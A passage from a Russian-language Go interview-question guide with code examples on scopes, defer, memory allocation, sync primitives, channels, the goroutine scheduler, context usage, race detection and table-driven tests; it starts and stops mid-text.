Bits) Bits { return b \u0026amp;^ flag } func Toggle(b, flag Bits) Bits { return b ^ flag } func Has(b, flag Bits) bool { return b\u0026amp;flag != 0 } func main() { var b Bits b = Set(b, F0) b = Toggle(b, F2) for i, flag := range [...]Bits{F0, F1, F2} { println(i, Has(b, flag)) } // 0 true \t// 1 false \t// 2 true }  Что можно почитать:\n О битовых операциях Поразрядные операции   Дополнительный блок фигурных скобок в функции Его можно использовать, и он означает отдельный скоуп для всех переменных, объявленных в нём (возможен и \u0026ldquo;захват переменных\u0026rdquo; объявленных вне скоупа ранее, естественно). Иногда используется для декомпозиции какого-то отдельного куска функции, к примеру.\nvar i, s1 = 1, \u0026#34;foo\u0026#34; { var j, s2 = 2, \u0026#34;bar\u0026#34; println(i, s1) // 1 foo \tprintln(j, s2) // 2 bar  s1 = \u0026#34;baz\u0026#34; } println(i, s1) // 1 baz //println(j, s2) // ERROR: undefined: j and s2 Так же это может быть связано с AST (Abstract Syntax Tree) - когда оно строится и происходят SSA (Static Single Assignment) оптимизации, к сожалению SSA не работает на всю длину дерева. Как следствие, если у нас слишком длинная функция (примерно дохулион строк) и мы по каким-то причинам не можем её декомпозировать, но можем изолировать какие-то скоупы то, таким образом, мы помогаем SSA произвести оптимизации (если они возможно).\nЧто такое захват переменной? Во вложенном скоупе есть возможность обращаться к переменным, объявленных в скоупе выше (но не наоборот). Обращение к переменным из вышестоящего скоупа и есть их захват. Типичной ошибкой является использование значение итератора в цикле:\nvar out []*int for i := 0; i \u0026lt; 3; i++ { out = append(out, \u0026amp;i) } println(*out[0], *out[1], *out[2]) // 3 3 3 Испраляется путём создания локальной (для скоупа цикла) переменной с копией знаяения итератора:\nvar out []*int for i := 0; i \u0026lt; 3; i++ { i := i // Copy i into a new variable. \tout = append(out, \u0026amp;i) } println(*out[0], *out[1], *out[2]) // 0 1 2  Что можно почитать:\n Using reference to loop iterator variable   Как работает defer? Defer является функцией отложенного вызова. Выполняется всегда (даже в случае паники внутри функции вызываемой) после того, как функция завершила своё выполнение но до того, как управление вернётся вызывающей стороне (более того - внутри defer возможен захват переменных, и даже возвращаемого результата). Часто используется для освобождения ресурсов/снятия блокировок. Пример использования:\nfunc main() { println(\u0026#34;result =\u0026#34;, f()) // f started \t// defer \t// defer in defer \t// result = 25 } func f() (i int) { println(\u0026#34;f started\u0026#34;) defer func() { recover() defer func() { println(\u0026#34;defer in defer\u0026#34;); i += 5 }() println(\u0026#34;defer\u0026#34;) i = i * 2 }() i = 10 panic(\u0026#34;panic is here\u0026#34;) } Когда выполняется ключевое слово defer, оно помещает следующий за ним оператор в список, который будет вызван до возврата функции.\nКак работает init? В Go есть предопределенная функция init(). Она выделяет фрагмент кода, который должен выполняться перед всеми другими частями пакета. Этот код будет выполняться сразу после импорта пакета.\nТакже функция init() используется для автоматической регистрации одного пакета в другом (например, так работает подавляющее большинство \u0026ldquo;драйверов\u0026rdquo; для различных СУБД, например - go-sql-driver/mysql/driver.go).\nФункцию init() можно использовать неоднократно в рамках даже одного файла, выполняться они будут в этом случае в порядке, как их встречает компилятор.\nХотя использование init() и является довольно полезным, но часто оно затрудняет чтение/понимание кода, и (почти) всегда можно обойтись без неё, поэтому необходимость её использования - всегда очень большой вопрос.\nПрерывание for/switch или for/select Что произойдёт в следующем примере, если f() вернёт true?\nfor { switch f() { case true: break case false: // Do something  } } Очевидно, будет вызван break. Вот только прерван будет switch, а не цикл for. Простое решение проблемы – использовать именованный (labeled) цикл и вызывать break c этой меткой, как в примере ниже:\nloop: for { switch f() { case true: break loop case false: // Do something  } } Сколько можно возвращать значений из функции? Теоретически, неограниченное количество значений. Так же хочется отметить, что есть правила \u0026ldquo;де-факто\u0026rdquo;, которых следует придерживаться:\n Последним значением возвращать ошибку, если её возврат подразумевается Первым значением возвращать контекст, если он подразумевается Хорошим тоном является не возвращать более четырёх значений Если функция что-то проверяет и возвращает значение + булевый результат проверки - то результат проверки возвращать последним (пример - os.LookupEnv(key string) (string, bool)) Если возвращается ошибка, то остальные значения возвращать нулевыми или nil  Память и управление ей Что такое heap и stack? Стек (stack) - это область оперативной памяти, которая создаётся для каждого потока. Он работает в порядке LIFO (Last In, First Out), то есть последний добавленный в стек кусок памяти будет первым в очереди на вывод из стека. Каждый раз, когда функция объявляет новую переменную, она добавляется в стек, а когда эта переменная пропадает из области видимости (например, когда функция заканчивается), она автоматически удаляется из стека. Когда стековая переменная освобождается, эта область памяти становится доступной для других стековых переменных.\nСтек быстрый, так как часто привязан к кэшу процессора. Размер стека ограничен, и задаётся при создании потока.\nКуча (heap) - это хранилище памяти, также расположенное в ОЗУ, которое допускает динамическое выделение памяти и не работает по принципу стека: это просто склад для ваших переменных. Когда вы выделяете в куче участок памяти для хранения переменной, к ней можно обратиться не только в потоке, но и во всем приложении. Именно так определяются глобальные переменные. По завершении приложения все выделенные участки памяти освобождаются. Размер кучи задаётся при запуске приложения, но, в отличие от стека, он ограничен лишь физически, и это позволяет создавать динамические переменные.\nВ сравнении со стеком, куча работает медленнее, поскольку переменные разбросаны по памяти, а не сидят на верхушке стека. То что попадает в кучу, живёт там пока не придёт GC.\nНо почему стек так быстр? Основных причин две:\n Стеку не нужно иметь сборщик мусора (garbage collector). Как мы уже упоминали, переменные просто создаются и затем вытесняются, когда функция завершается. Не нужно запускать сложный процесс освобождения памяти от неиспользуемых переменных и т.п. Стек принадлежит одной горутине, переменные не нужно синхронизировать в сравнении с теми, что находятся в куче. Что также повышает производительность  Где выделяется память под переменную? Можно ли этим управлять? Прямых инструментов для управления местом, где будет выделена память у нас, к сожалению - нет. Но есть некоторые практики, которые позволяют это понять и использовать эффективно.\nПамять под переменную может быть выделена в куче (heap) или стеке (stack). Очень приблизительно:\n Стек содержит последовательность переменных для заданной горутины (как только функция завершила работу, переменные вытесняются из стека) Куча содержит общие (shared) переменные (глобальные и т.п.)  Давайте рассмотрим простой пример, в котором вы возвращаем значение:\nfunc getFooValue() foo { var result foo // Do something \treturn result } Здесь переменная result создаётся в текущей горутине. И эта переменная помещается в стек. Как только функция завершает работу, клиент получает копию этой переменной. Исходная переменная вытесняется из стека. Эта переменная всё ещё существует в памяти, до тех пор, пока не будет затёрта другой переменной, но к этой переменной уже нельзя получить доступ.\nТеперь тот же пример, но с указателем:\nfunc getFooPointer() *foo { var result foo // Do something \treturn \u0026amp;result } Переменная result также создаётся текущей горутиной, но клиент получает указатель (копию адреса переменной). Если result вытеснена из стека, клиент функции не сможет получить доступ к переменной.\nВ подобном сценарии компилятор Go вынужден переместить переменную result туда, где она может быть доступна (shared) – в кучу (heap).\nХотя есть и исключение. Для примера:\nfunc main() { p := \u0026amp;foo{} f(p) } Поскольку мы вызываем функцию f() в той же горутине, что и функцию main(), переменную p не нужно перемещать. Она просто находится в стеке и вложенная функция f() будет иметь к ней доступ.\nВ качестве заключения, когда мы создаём функцию - поведением по умолчанию должно быть использование передачи по значению, а не по указателю. Указатель должен быть использован только когда мы действительно хотим переиспользовать данные.\nКакое поведение по умолчанию используется в Go при передаче в функцию? По умолчанию всегда используется копирование, т.е. передача по значению. Для передачи по указателю необходимо это явно указывать:\nfunc main() { var i = 5 byValue(i) // 5 \tbyPointer(\u0026amp;i) // 5 } func byValue(i int) { println(i) } // передача по значению (копии переменной) func byPointer(i *int) { println(*i) } // передача по указателю Что можешь рассказать про escape analysis? Escape analysis - это процесс, который компилятор использует для определения размещения значений, созданных вашей программой.\nВ частности, компилятор выполняет статический анализ кода, чтобы определить, может ли значение быть помещено в стековый фрейм для функции, которая его строит, или значение должно \u0026ldquo;сбежать\u0026rdquo; в кучу. Используется разработчиками для оптимизации кода и аналитики причин возможного замедления.\nКоманда для запуска escape-анализа: go build -gcflags=\u0026quot;-m\u0026quot; (так же можно использовать флаги -N для отключени оптимизаций, -l для отключения \u0026ldquo;инлайнинга\u0026rdquo;).\n Что можно почитать:\n Языковая механика escape analysis Escape Analysis in Golang   Сoncurrency (конкурентность) В данном разделе будут вопросы, относящиеся к параллелизму и конкурентной работе.\nКак устроен мьютекс? Mutex означает MUTual EXclusion (взаимное исключение), и обеспечивает безопасный доступ к общим ресурсам.\nПод капотом мьютекса используются функции из пакета atomic (atomic.CompareAndSwapInt32 и atomic.AddInt32), так что можно считать мьютекс надстройкой над atomic. Мьютекс медленнее чем atomic, потому что он блокирует другие горутины на всё время действия блокировки. А в свою очередь atomic быстрее потому как использует атомарные инструкции процессора.\nВ момент, когда нужно обеспечить защиту доступа - вызываем метод Lock(), а по завершению операции изменения/чтения данных - метод Unlock().\nВ чем отличие sync.Mutex от sync.RWMutex? Помимо Lock() и Unlock() (у sync.Mutex), у sync.RWMutex есть отдельные аналогичные методы только для чтения - RLock() и RUnlock(). Если участок в памяти нуждается только в чтении - он использует RLock(), который не заблокирует другие операции чтения, но заблокирует операцию записи и наоборот.\nПо большому счёту, RWMutex это комбинация из двух мьютексов.\nЧто такое synс.Map? Коротко - предоставляет атомарный доступ к элементам map.\nGo, как известно, является языком созданным для написания concurrent программ - программ, который эффективно работают на мультипроцессорных системах. Но тип map не безопасен для параллельного доступа. То есть для чтения, конечно, безопасен - 1000 горутин могут читать из map без опасений, но вот параллельно в неё ещё и писать - уже нет.\nДля обеспечения потоко-безопасного доступа к map можно использовать sync.RWMutex, но он имеет проблему производительности при работе на большом количестве ядер процессора (в RWMutex при блокировке на чтение каждая горутина должна обновить поле readerCount - простой счётчик, с помощью atomic.AddInt32(), что проиводит к сбросу кэша для этого адреса памяти для всех ядер, и каждое ядро становится в очередь и ждёт этот сброс и вычитывание из кэша - эта проблема называется cache contention).\nsync.Map решает совершенно конкретную проблему cache contention в стандартной библиотеке для таких случаев, когда ключи в map стабильны (не обновляются часто) и происходит намного больше чтений, чем записей.\nПример работы с sync.Map:\nvar m sync.Map m.Store(\u0026#34;one\u0026#34;, 1) // запись one, ok := m.Load(\u0026#34;one\u0026#34;) // чтение  fmt.Println(one, ok) // 1 true  m.Range(func(k, v interface{}) bool { // итерация эл-ов мапы \tfmt.Println(k, v) // one 1  return true }) m.Delete(\u0026#34;one\u0026#34;) // удаление  Что можно почитать:\n Разбираемся с новым sync.Map в Go 1.9   Какие ещё примитивы синхронизации знаешь? Как было сказано выше - для синхронизации можно использовать мьютексы. Кроме того из стандартной библиотеки нам доступны:\nsync.WaitGroup Используется для координации в случае, когда программе приходится ждать окончания работы нескольких горутин (эта конструкция похожа на CountDownLatch в Java). Отличный способ дождаться завершения набора одновременных операций. Принцип работы следующий:\nvar wg sync.WaitGroup wg.Add(1) // увеличиваем счётчик на 1 go func() { fmt.Println(\u0026#34;task 1\u0026#34;) \u0026lt;-time.After(time.Second) fmt.Println(\u0026#34;task 1 done\u0026#34;) wg.Done() // уменьшаем счётчик на 1 }() wg.Add(1) // увеличиваем счётчик на 1 go func() { fmt.Println(\u0026#34;task 2\u0026#34;) \u0026lt;-time.After(time.Second) fmt.Println(\u0026#34;task 2 done\u0026#34;) wg.Done() // уменьшаем счётчик на 1 }() wg.Wait() // блокируемся, пока счётчик не будет == 0 // task 2 // task 1 // task 2 done // task 1 done // Total time: 1.00s sync.Cond Условная переменная (CONDition variable) полезна, например, если мы хотим разблокировать сразу несколько горутин (Broadcast), что не получится сделать с помощью канала. Метод Signal отправляет сообщение самой долго-ожидающей горутине. Пример использования:\nvar ( c = sync.NewCond(\u0026amp;sync.Mutex{}) wg sync.WaitGroup // нужна только для примера  free = true ) wg.Add(1) go func() { defer wg.Done() c.L.Lock() for !free { // проверяем, что ресурс свободен \tc.Wait() } fmt.Println(\u0026#34;work\u0026#34;) c.L.Unlock() }() free = false // забрали ресурс, чтобы выполнить с ним работу \u0026lt;-time.After(1 * time.Second) // эмуляция работы free = true // освободили ресурс c.Signal() // оповестили горутину  wg.Wait() sync.Once Позволяет определить задачу для однократного выполнения за всё время работы программы. Содержит одну-единственную функцию Do, позволяющую передавать другую функцию для однократного применения.\nvar once sync.Once for i := 0; i \u0026lt; 10; i++ { once.Do(func() { fmt.Println(\u0026#34;Hell yeah!\u0026#34;) }) } // Hell yeah! (выводится 1 раз вместо 10) sync.Pool Используется для уменьшения давления на GC путём повторного использования выделенной памяти (потоко-безопасно). Пул необязательно освободит данные при первом пробуждении GC, но он может освободить их в любой момент. У пула нет возможности определить и установить размер и нет необходимости заботиться о его переполнении.\n Что можно почитать:\n Go sync.Pool   Какие типы каналов существуют? Если которотко, то синхронные (небуферизированным) и асинхронные (буферизированные), оба работают по принципу FIFO (first in, first out) очереди.\nКанал - это объект связи, с помощью которого (чаще всего) горутины обмениваются данными. Потокобезопасен, передаётся \u0026ldquo;по указателю\u0026rdquo;. Технически это можно представить как конвейер (или трубу), откуда можно считывать и помещать данные. Для создания канала предоставляет ключевое слово chan - создание не буферизированного канала c := make(chan int), для чтения из канала - data := \u0026lt;-c, для записи - c \u0026lt;- 123, и закрытие close(c).\nЗапись данных в закрытый канал вызовет панику.\nЧтение или запись данных в небуферизированный канал блокирует горутину и контроль передается свободной горутине. Через закрытый канал невозможно будет передать или принять данные (проверить открытость канала можно используя val, ok := \u0026lt;- channel, где ok == true в том случае, если канал открыт; в противном случае вернётся false и нулевое значение val исходя из типа данных для канала).\nБуферизированный канал создается указанием второго аргумента для make - c := make(chan int, 5), в этом случае горутина не блокируется до тех пор, пока буфер не будет заполнен. Подобно слайсам, буферизированный канал имеет длину (len, количество сообщений в очереди, не считанных) и емкость (cap, размер самого буфера канала):\nc := make(chan string, 5) c \u0026lt;- \u0026#34;foo\u0026#34; c \u0026lt;- \u0026#34;bar\u0026#34; close(c) println(len(c), cap(c)) // 2 5  for { val, ok := \u0026lt;-c // обрати внимание - читаем из уже закрытого канала  if !ok { break } println(val) } // \u0026#34;foo\u0026#34; // \u0026#34;bar\u0026#34; Используя буферизованный канал и цикл for val := range c { ... } мы можем читать с закрытых каналов (поскольку у закрытых каналов данные все еще живут в буфере).\nКроме того, сужествует синтаксический сахар однонаправленных каналов (улучшает безопасность типов в программe, что, как следствие, порождает меньше ошибок):\n c := make(\u0026lt;-chan int) - только для чтения c := make(chan\u0026lt;- int) - только для записи  Так же можно в сигнатуре принимаемой функции указать однонаправленность канала (func write(c chan\u0026lt;- string) { ... }) - в этом случае функция не сможет из него читать, а сможет только писать или закрыть его.\nЧитать \u0026ldquo;одновременно\u0026rdquo; из нескольких каналов возможно с помощью select (оператор select является блокируемым, за исключением использования default):\nc1, c2 := make(chan string), make(chan string) defer func() { close(c1); close(c2) }() // не забываем прибраться  go func(c chan\u0026lt;- string) { \u0026lt;-time.After(time.Second); c \u0026lt;- \u0026#34;foo\u0026#34; }(c1) go func(c chan\u0026lt;- string) { \u0026lt;-time.After(time.Second); c \u0026lt;- \u0026#34;bar\u0026#34; }(c2) for i := 1; ; i++ { select { // блокируемся, пока в один из каналов не попадёт сообщение \tcase val := \u0026lt;-c1: println(\u0026#34;channel 1\u0026#34;, val) case val := \u0026lt;-c2: println(\u0026#34;channel 2\u0026#34;, val) } if i \u0026gt;= 2 { // через 2 итерации выходим (иначе будет deadlock) \tbreak } } // channel 1 foo // channel 2 bar // Total execution time: 1.00s В случае, если в оба канала одновременно придут сообщения (или они уже там были), то case будет выбран случайно (а не по порядку их объявления, как могло бы показаться).\nЕсли ни один из каналов недоступен для взаимодействия, и секция default отсутствует, то текущая горутина переходит в состояние waiting до тех пор, пока какой-то из каналов не станет доступен.\nЕсли в select указан default, то он будет выбран в том случае, если все каналы не имеют сообщений (таким образом select становится не блокируемым).\nПод капотом (src/runtime/chan.go) канал представлен структурой:\ntype hchan struct { qcount uint // количество элементов в буфере \tdataqsiz uint // размерность буфера \tbuf unsafe.Pointer // указатель на буфер для элементов канала \telemsize uint16 // размер одного элемента в канале \tclosed uint32 // флаг, указывающий, закрыт канал или нет \telemtype *_type // содержит указатель на тип данных в канале \tsendx uint // индекс (смещение) в буфере по которому должна производиться запись \trecvx uint // индекс (смещение) в буфере по которому должно производиться чтение \trecvq waitq // указатель на связанный список горутин, ожидающих чтения из канала \tsendq waitq // указатель на связанный список горутин, ожидающих запись в канал \tlock mutex // мьютекс для безопасного доступа к каналу } В общем случае, горутина захватывает мьютекс, когда совершает какое-либо действие с каналом, кроме случаев lock-free проверок при неблокирующих вызовах.\nGo не выделяет буфер для синхронных (небуферизированных) каналов, поэтому указатель на буфер равен nil и dataqsiz равен нулю. При чтении из канала горутина произведёт некоторые проверки, такие как: закрыт ли канал, буферизирован он или нет, содержит ли гоуртины в send-очереди. Если ожидающих отправки горутин нет - горутина добавит сама себя в recvq и заблокируется. При записи другой горутиной все проверки повторяются снова, и когда она проверяет recvq очередь, она находит ожидающую чтение горутину, удаляет её из очереди, записывает данные в её стек и снимает блокировку. Это единственное место во всём рантайме Go, когда одна горутина пишет напрямую в стек другой горутины.\nПри создании асинхронного (буферизированного) канала make(chan bool, 1) Go выделяет буфер и устанавливает значение dataqsiz в единицу. Чтобы горутине отправить отправить значение в канал, сперва производятся несколько проверок: пуста ли очередь recvq, пуст ли буфер, достаточно ли места в буфере. Если всё ок, то она просто записывает элемент в буфер, увеличивает значение qcount и продолжает исполнение далее. Когда буфер полон, буферизированный канал будет вести себя точно так же, как синхронный (небуферизированный), тоесть горутина добавит себя в очередь ожидания и заблокируется.\nПроверки буфера и очереди реализованы как атомарные операции, и не требуют блокировки мьютекса.\nПри закрытии канала Go проходит по всем ожидающим на чтение или запись горутинам и разблокирует их. Все получатели получают дефолтные значение переменных того типа данных канала, а все отправители паникуют.\n Что можно почитать:\n Анатомия каналов в Go Как устроены каналы в Go Под капотом Golang - как работают каналы. Часть 1 Строение каналов в Golang. Часть 2   Что можно делать с закрытым каналом? Из закрытого канала можно читать с помощью for val := range c { ... } - вычитает все сообщения что в нём есть, или с помощью:\nfor { if val, ok := \u0026lt;-c; ok { println(val) } else { break } } Расскажи про планировщик (горутин) Goroutine scheduler является перехватывающим задачи (work-stealing) планировщиком, который был введен еще в Go 1.1 Дмитрием Вьюковым вместе с командой Go. Основная его суть заключается в том, что он управляет:\n G (горутинами) - просто горутины Go M (машинами aka потоками или тредами) - потоки ОС, которые могут выполнять что-либо или же бездействовать P (процессорами) - можно рассматривать как ЦП (физическое ядро); представляет ресурсы, необходимые для выполнения нашего Go кода, такие как планировщик или состояние распределителя памяти  Основная задача планировщика состоит в том, чтобы сопоставить каждую G (код, который мы хотим выполнить) с M (где его выполнять) и P (права и ресурсы для выполнения).\nКогда M (поток ОС) прекращает выполнение нашего кода, он возвращает свой P (ЦП) в пул свободных P. Чтобы возобновить выполнение Go кода, он должен повторно заполучить его. Точно так же, когда горутина завершается, объект G (горутина) возвращается в пул свободных G и позже может быть повторно использован для какой-либо другой горутины.\nGo запускает столько тредов, сколько доступно процессорных ядер (если вы специально это не перенастраиваете) и распределяет на эти треды сколько угодно горутин которые уже запускает программист. В один момент на одном ядре ЦП может находиться в исполнении только одна грутина, а в очереди исполнения их может быть неограниченное количество.\nТреды M во время выполнения могут переходить от одного процессора P к другому. Например, когда тред делает системный вызов, в ответ на который ОС блокирует этот тред (например - чтение какого-то большого файла с диска) - мало того что заблокируется сама горутина, что спровоцировала этот вызов, но и все остальные, что стоят в очереди для этого процессора P. Чтоб этого не происходило - Go отвязывает горутины стоящие в очереди от этого процессора P и переназначает на другие.\nОсновные типы многозадачности что используются в большинстве ОС это \u0026ldquo;вытесняющая\u0026rdquo; (все ресурсы делятся между всеми программами одинаково, всем выделяется одинаковое время выполнения) и \u0026ldquo;кооперативная\u0026rdquo; (программы выполняются столько, сколько им нужно, и сами уступают друг-другу место). В Go используется неявная кооперативность:\n Горутина уступает место другис при обращении к вводу-выводу, каналам, вызовам ОС и т.д. Может уступить место при вызове любой функции (с некоторой вероятностью произойдет переключение между горутинами) Есть явный способ переключить планировщик на другую горутину - вызвать функцию runtime.Gosched() (почти никогда не нужна, но она есть)  Основные принципы планировщика:\n Очередь FIFO (first in - first out) - порядок запуска горутин обуславливается порядом их вызова Необходимый минимум тредов - создается не больше тредов чем доступных ядер ЦП Захват чужой работы - когда тред простаивает, то он не удаляется рантаймом Go, а будет по возможности \u0026ldquo;нагружен\u0026rdquo; работой, взятой из очередей горутин на исполнение с других тредов \u0026ldquo;Неинвазивность\u0026rdquo; - работа горутин насильно не прерывается  Ограничения:\n Очередь FIFO (нет приоритезации и изменения порядка исполнения) Отсутствие гарантий времени выполнения (времени запуска горутин) Горутины могут перемещаться между тредами, что снижает эффективность кэшей     Что можно почитать:\n Горутины: всё, что вы хотели знать, но боялись спросить Что такое горутины и каков их размер?   Что такое горутина? Горутина (goroutine) - это функция, выполняющаяся конкурентно с другими горутинами в том же адресном пространстве.\nДля её запуска достаточно использовать ключевое слово go перед именем вызываемой (или анонимной) функции.\nГорутины очень легковесны (~2,6Kb на горутину). Практически все расходы - это создание стека, который очень невелик, хотя при необходимости может расти. Область их применения чаще всего следующая:\n Когда нужна асинхронность (например когда мы работаем с сетью, диском, базой данных, защищенным мьютексом ресурсом и т.п.) Когда время выполнения функции достаточно велико и можно получить выигрыш, нагрузив другие ядра  Сама структура горутины занимает порядка 600 байт, но для неё ещё выделяется и её собственный стек, минимальный размер котого составляет 2Kb, который увеличивается и уменьшается по мере необходимости (максимум зависит от архитектуры и составляет 1 ГБ для 64-разрядных систем и 250 МБ для 32-разрядных систем).\nПереключение между двумя Горутинами - супер дешевое, O(1), то есть, не зависит от количества созданных горутин в системе. Всё, что нужно сделать для переключения, это поменять 3 регистра - Program counter, Stack Pointer и DX.\nВ чем отличия горутин от потов ОС?  Каждый поток операционной системы имеет блок памяти фиксированного размера (зачастую до 2 Мбайт) для стека - рабочей области, в которой он хранит локальные переменные вызовов функций, находящиеся в работе или приостановленные на время вызова другой функции. В противоположность этому go-подпрограмма начинает работу с небольшим стеком, обычно около 2 Кбайт. Стек горутины, подобно стеку потока операционной системы, хранит локальные переменные активных и приостановленных функций, но, в отличие от потоков операционной системы, не является фиксированным; при необходимости он может расти и уменьшаться Потоки операционной системы планируются в ее ядре, а у go есть собственный планировщик (m:n) мультиплексирующий (раскидывающий) горутинки (m) по потокам (n). Основной плюс - отсутствие оверхеда на переключение контекста Планировщик Go использует параметр с именем GOMAXPROCS для определения, сколько потоков операционной системы могут одновременно активно выполнять код Go. Его значение по умолчанию равно количеству процессоров (ядер) компьютера, так что на машине с 8 процессорами (ядрами) планировщик будет планировать код Go для выполнения на 8 потоках одновременно. Спящие или заблокированные в процессе коммуникации go-подпрограммы потоков для себя не требуют. Go-подпрограммы, заблокированные в операции ввода-вывода или в других системных вызовах, или при вызове функций, не являющихся функциями Go, нуждаются в потоке операционной системы, но GOMAXPROCS их не учитывает В большинстве операционных систем и языков программирования, поддерживающих многопоточность, текущий поток имеет идентификацию, которая может быть легко получена как обычное значение (обычно - целое число или указатель). У горутин нет идентификации, доступной программисту. Так решено во время проектирования языка, поскольку локальной памятью потока программисты злоупотребляют  Где аллоцируется память для горутин? Так как горутины являются stackful - то и память для них (их состояние) хранится на стеке. Поэтому, теоритически, если очень постараться и сделать милилард вложенных вызовов, то можно сделать себе переполнение стека.\nДля самих же переменных, что используются внутри горутин память берётся с хипа (ограничены только размером \u0026ldquo;физического\u0026rdquo; хипа, т.е. объемом памяти сколько есть на машине).\n Что можно почитать:\n Достучаться до небес - Корутины, Горутины и прочие Рутины Go: как изменяется размер стека горутины?   Как завершить много горутин? Один из вариантов - это пристрелить main (шутка). Работу одной гороутины в принципе нельзя принудительно остановить из другой. Механизмы их завершения необходимо реализовывать отдельно (учить сами горутины завершаться).\nНаиболее часто используются 2 подхода - это использование контекста context.Context:\nimport ( \u0026#34;context\u0026#34; \u0026#34;time\u0026#34; ) func f(ctx context.Context) { loop: for { select { case \u0026lt;-ctx.Done(): println(\u0026#34;break f\u0026#34;) break loop default: println(\u0026#34;do some work\u0026#34;) \u0026lt;-time.After(time.Millisecond * 100) } } } func main() { ctx, cancel := context.WithCancel(context.Background()) for i := 0; i \u0026lt; 3; i++ { go f(ctx) // запускаем 3 горутины \t} \u0026lt;-time.After(time.Millisecond * 50) cancel() // отменяем контекст, на что горутины должны среагировать выходом \t\u0026lt;-time.After(time.Millisecond * 60) // do some work \t// do some work \t// do some work \t// break f \t// break f \t// break f } И отдельного канала для уведомлений о необходимости завершения (часто для уведомлений используется пустая структура struct{}, которая ничего не весит):\nimport ( \u0026#34;time\u0026#34; ) func f(c \u0026lt;-chan struct{}) { loop: for { select { case \u0026lt;-c: println(\u0026#34;break f\u0026#34;) break loop default: println(\u0026#34;do some work\u0026#34;) \u0026lt;-time.After(time.Millisecond * 100) } } } func main() { const workersCount = 3 var c = make(chan struct{}, workersCount) for i := 0; i \u0026lt; workersCount; i++ { go f(c) // запускаем 3 горутины \t} \u0026lt;-time.After(time.Millisecond * 50) for i := 0; i \u0026lt; workersCount; i++ { c \u0026lt;- struct{}{} // отправляем 3 сообщения в канал (по одному для каждой горутины) о выходе \t} close(c) \u0026lt;-time.After(time.Millisecond * 60) // do some work \t// do some work \t// do some work \t// break f \t// break f \t// break f } Кейсы использования контекста Пакет context в Go особенно полезен при взаимодействиях с API и медленными процессами, особенно в production-grade системах. С его помощью можно уведомить горутины о необходимости завершить свою работу, \u0026ldquo;пошарить\u0026rdquo; какие-то данные (например, в middleware), или легко организовать работу с таймаутом.\ncontext.WithCancel() Эта функция создает новый контекст из переданного ей родительского, возвращая первым аргуметом функцию \u0026ldquo;отмены контекста\u0026rdquo; (при её вызове родительский контект \u0026ldquo;отменен\u0026rdquo; не будет), а вторым - новый контекст. Важно - вызывать функцию отмены контекста должна только та функция, которая его создает. При вызове функции отмены сам контекст и все котнекты, созданные на основе него получат в ctx.Done() пустую структуру и в ctx.Err() ошибку context.Canceled.\nctx, cancel := context.WithCancel(context.Background()) fmt.Println(ctx.Err()) // nil  cancel() fmt.Println(\u0026lt;-ctx.Done()) // {} fmt.Println(ctx.Err().Error()) // context canceled context.WithDeadline() Так же создает контекст от родительского, который отменится самостоятельно при наступлении переданного ему временной отметке, или при вызове функции отмены. Отмена/таймаут затрагивает только сам контекст и его \u0026ldquo;наследников\u0026rdquo;. ctx.Err() возвращает ошибку context.DeadlineExceeded. Полезно для реализации таймаутов:\nctx, cancel := context.WithDeadline( context.Background(), time.Now().Add(time.Millisecond*100), ) defer cancel() fmt.Println(ctx.Err()) // nil  \u0026lt;-time.After(time.Microsecond * 110) fmt.Println(\u0026lt;-ctx.Done()) // {} fmt.Println(ctx.Err().Error()) // context deadline exceeded context.WithTimeout() Работает аналогично context.WithDeadline() за исключением того, что принимает в качестве значения таймаута длительность (например - time.Second):\nctx, cancel := context.WithTimeout(context.Background(), time.Second*2) context.WithValue() Позволяет \u0026ldquo;пошарить\u0026rdquo; данные через всё контекстное деверо \u0026ldquo;ниже\u0026rdquo;. Часто используют чтоб передать таким образом, например, логгер или HTTP запрос в цепочке middleware (но в 9 из 10 случаев так делать не надо, это можно считать антипаттерном). Лучше всего использовать функции для помещения/извлечения данных из контекста (так как \u0026ldquo;в нём\u0026rdquo; они храняться как interface{}):\nimport ( \u0026#34;context\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) const loggerCtxKey = \u0026#34;logger\u0026#34; // should be unique  func PutLogger(ctx context.Context, logger *log.Logger) context.Context { return context.WithValue(ctx, loggerCtxKey, logger) } func GetLogger(ctx context.Context) *log.Logger { return ctx.Value(loggerCtxKey).(*log.Logger) } func f(ctx context.Context) { logger := GetLogger(ctx) logger.Print(\u0026#34;inside f\u0026#34;) println(logger) } func main() { var ( logger = log.New(os.Stdout, \u0026#34;\u0026#34;, 0) ctxWithLogger = PutLogger(context.Background(), logger) ) logger.Printf(\u0026#34;main\u0026#34;) println(logger) f(ctxWithLogger) // main \t// 0xc0000101e0 \t// inside f \t// 0xc0000101e0 }    Что можно почитать:\n Разбираемся с пакетом Context в Golang   При этом ok == true до того момента, пока в канале есть сообщения (вне зависимости от того, открыт он или закрыт), в противном случае ok == false а val будет нулевым значением в зависимости от типа данных канала. При попытке записи в закрытый канал будет паника (авторы языка так сделали \u0026ldquo;ибо нефиг - канал закрыт значит закрыт\u0026rdquo;).\nКак задетектить гонку? Пишем тесты, и запускаем их с флагом -race (в этом случае рантайм будет в случайном порядке переключаться между горутинами (если не ошибаюсь), и компилятор генерирует дополнительный код, который \u0026ldquo;журналирует\u0026rdquo; обращения к памяти). Этот флаг можно использовать как для go test, так и для go run или go build.\nДетектор гонки основан на библиотеке времени выполнения (runtime library) C/C++ ThreadSanitizer.\nТак же предпочитаю писать тесты, провоцирующие гонку. Код в этом случае будет работать значительно медленнее, но для этапа тестирования это и не так важно. А именно для тестируемоой структуры запускаю (например) 100 горутин которые читают и пишут что-то в случайном порядке.\nВажно и ещё одно высказывание - \u0026ldquo;Если race detector обнаруживает состояние гонки, то оно у вас наверняка есть; если же не обнаруживает - то это не означает что его нет\u0026rdquo;.\nТестирование Для unit-тестирования (aka модульного) используется команда вида go test, которая запускает все функции, что начинаются с префикса Test в файлах, что имеют в своем имени постфикс _test.go - всё довольно просто.\nВажно писать сам код так, чтоб его можно было протестировать (например - не забывать про инвертирование зависимостей и использовать интерфейсы там, где они уместны).\nTDT, Table-driven tests (табличное тестирование) Являются более предпочтительным вариантом для тестирования множества однотипных кейсов перед описанием \u0026ldquo;один кейс - один тест\u0026rdquo;, так как позволяют отделить часть входных данных и ожидаемых данных от всех этапов инициализации и tear-down (не знаю как это будет по-русски). Например, тестируемая функция и её тест могут выглядеть так:\npackage main func Sum(a, b int) int { return a + b } package main import \u0026#34;testing\u0026#34; func TestSum(t *testing.T) { for name, tt := range map[string]struct { // ключ мапы - имя теста \tgiveOne, giveSecond int wantResult int }{ \u0026#34;1 + 1 = 2\u0026#34;: { giveOne: 1, giveSecond: 1, wantResult: 